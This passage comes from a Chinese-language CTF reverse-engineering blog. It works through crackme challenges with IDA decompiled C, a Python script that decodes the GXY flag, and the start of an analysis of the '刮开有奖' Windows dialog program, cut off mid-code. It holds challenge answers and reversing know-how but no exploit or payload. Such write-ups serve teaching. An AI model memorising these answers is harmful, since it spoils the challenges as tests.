keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>      <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"emmm,you can't find flag 23333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>前面可以进行如下分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185727822.png" alt="image-20220327185727822" /></p>
<p>f1 字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185804806.png" alt="image-20220327185804806" /></p>
<p>f1，f2 分析如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185913533.png" alt="image-20220327185913533" /></p>
<p>s 分析结果如下</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0x7F</span> <span class="token number">0x66</span> <span class="token number">0x6F</span> <span class="token number">0x60</span> <span class="token number">0x67</span> <span class="token number">0x75</span> <span class="token number">0x63</span> <span class="token number">0x69</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327190254779.png" alt="image-20220327190254779" /></p>
<p>由此可以看出 flag 是由 f1 和 f2 拼接而成，而 f1 已经给出，接下来只要破解 f2 即可得到 flag</p>
<p>而在 case4 中对 f2 进行赋值，在 f5 中对 f2 进行处理</p>
<p>脚本编写：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">'GXY&#123;do_not_'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>f2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre>s <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        s <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>f2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        s <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>f2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    flag <span class="token operator">+=</span> s</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p>python 允许结果如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327190739029.png" alt="image-20220327190739029" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>do_not_hate_me<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="刮开有奖"><a class="anchor" href="#刮开有奖">#</a> 刮开有奖</h2>
<p>这是一个赌博程序，快去赚钱吧！！！！！！！！！！！！！！！！！！！！！！！！！！！(在编辑框中的输入值，即为 flag，提交即可) 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件运行，任意输入后闪退</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328180351391.png" alt="image-20220328180351391" /></p>
<p>根据题目信息我们可以知道，我们能成功输入的值就是我们的 flag</p>
<p><strong>查壳</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328180715520.png" alt="image-20220328180715520" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328180815054.png" alt="image-20220328180815054" /></p>
<p>无壳且 32 位运行程序，丢入 ida pro</p>
<p><strong>找到 main 函数</strong></p>
<p>winmain 窗口程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328181008436.png" alt="image-20220328181008436" /></p>
<p>简单分析之后可以发现 <code>DialogFunc</code>  为主要函数</p>
<p>f5 反编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328181156602.png" alt="image-20220328181156602" /></p>
<p>跟进 <code>DialogFunc函数</code> ，得到如下结果：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>INT_PTR __stdcall <span class="token function">DialogFunc</span><span class="token punctuation">(</span>HWND hDlg<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// esi</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// edi</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-20030h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-20028h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-20024h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-20020h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-2001Ch]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-20018h]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-20014h]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-20010h]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-2000Ch]</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-20008h]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  CHAR String<span class="token punctuation">[</span><span class="token number">65536</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-20004h] BYREF</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">char</span> v18<span class="token punctuation">[</span><span class="token number">65536</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10034h] [ebp-10004h] BYREF</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">272</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">273</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">==</span> <span class="token number">1001</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">memset</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFFFFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">GetDlgItemTextA</span><span class="token punctuation">(</span>hDlg<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> String<span class="token punctuation">,</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>      v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>      v8 <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>      v9 <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>      v10 <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>      v11 <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>      v12 <span class="token operator">=</span> <span class="token number">78</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      v13 <span class="token operator">=</span> <span class="token number">72</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>      v14 <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>      v15 <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>      v16 <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>      <span class="token function">sub_4010F0</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>      <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFFFFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>      v18<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>      v18<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>      v18<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>      v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_401000</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>      <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFFFFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>      v18<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>      v18<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>      v18<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>      v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_401000</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">34</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token operator">&amp;&amp;</span> String<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> v10</pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token operator">&amp;&amp;</span> <span class="token number">4</span> <span class="token operator">*</span> String<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">141</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token operator">*</span> v8</pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token operator">&amp;&amp;</span> String<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v13 <span class="token operator">/</span> <span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"ak1w"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"V1Ax"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hDlg<span class="token punctuation">,</span> <span class="token string">"U g3t 1T!"</span><span class="token punctuation">,</span> <span class="token string">"@_@"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>  <span class="token function">EndDialog</span><span class="token punctuation">(</span>hDlg<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328181232693.png" alt="image-20220328181232693" /></p>
<p>跟进 String 查看，分别是字符串每个字符的地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328182006408.png" alt="image-20220328182006408" /></p>
<p>所以，只需把每个对应的字符逆推出来，那么也就得到了我们想要的 flag 啦。</p>
<p><strong>开始逆推：</strong></p>
<p>首先我们知道从 v7 [0] 至 v16 这 11 个变量的值，往后碰到 sub_4010F0 (v7, 0, 10) 函数，点进去发现有对以 v7 为首地址的字符进行了处理，直接粘贴</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">sub_4010F0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// esi</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ecx</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>  result <span class="token operator">=</span> a3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> a2<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> a3<span class="token punctuation">;</span> a2 <span class="token operator">=</span> i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    v5 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;</span> result <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>      <span class="token keyword">do</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> result<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>          <span class="token operator">++</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> v6 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>              <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>          v5 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> result<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token operator">--</span>result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>      <span class="token keyword">while</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> result <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>LABEL_13<span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> result<span class="token punctuation">)</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token function">sub_4010F0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    result <span class="token operator">=</span> a3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token operator">++</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>转换成 C 语言格式进行处理，解出处理后对应的值</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>using namespace std<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">int</span>  <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// esi</span></pre></td></tr><tr><td 